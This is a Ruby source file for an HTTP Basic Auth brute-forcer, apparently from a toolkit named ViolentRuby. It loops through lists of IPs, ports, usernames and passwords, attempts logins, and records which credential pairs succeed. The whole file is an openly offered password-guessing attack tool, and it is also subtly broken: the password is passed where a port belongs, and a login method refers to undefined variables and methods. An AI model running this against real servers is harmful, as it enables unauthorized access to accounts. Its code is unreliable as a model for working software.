require 'net/http'

module ViolentRuby

	class HTTPBruteForcer

		attr_accessor :users
		attr_accessor :passwords
		attr_accessor :ips
		attr_accessor :ports

		def initialize(args = {})
			self.users = process_args(args[:users])
			self.passwords = process_args(args[:passwords])
			self.ips = process_args(args[:ips])
			self.ports = process_args(args[:ports])
		end

		def brute_force
			results = []
			self.users = file_to_array(self.users)
			self.passwords = file_to_array(self.passwords)
			self.ports = file_to_array(self.ports)
			self.ips = file_to_array(self.ips)
			meets_our_requirements?(ips: self.ips, ports: self.ports, usernames: self.usernames, passwords: self.passwords)
			self.ips.each do |ip|
				self.ports.each do |port|
					self.users.each do |user|
						self.passwords.each do |password|
							if connectable?(ip, password) 
								if able_to_login?(ip: ip, password: password, user: user, port: port)
									result = format_result("SUCCESS", ip, port, user, password)
								else
									result = format_result("FAILURE", ip, port, user, password)
								end
								results << result
								yield result if block_given?
							end
						end
					end
				end
			end
			results
		end
		
		def connectable?(ip, port)
			begin
				http = Net::HTTP.new(ip, port)
				req = Net::HTTP::Get.new("/")
				http.request(req)
				return true
			rescue
				return false
			end
		end

		def able_to_login?(args = {})
			http = Net::HTTP.new(ip, port)
			req = Net::HTTP::Get.new("/")
			req.basic_auth(args[:user], args[:password])
			http.request(req).code == "200"
		end

		alias brute_force! brute_force

		private

		def process_args(arg)
			if arg.is_a? Array or arg.is_a? NilClass
				return arg
			else
				file_to_array(arg)
			end
		end
		
		def file_to_array(arg)
			return arg if arg.is_a? Array
			raise ArgumentError, "Arg must be a file" unless File.file? arg
			File.read(arg).split("\n").map(&:strip)
		end

		def format_result(type, ip, port, user, password)
			{ time: Time.now, type: type, ip: ip, port: port, user: user, password: password }
		end

	end
end

				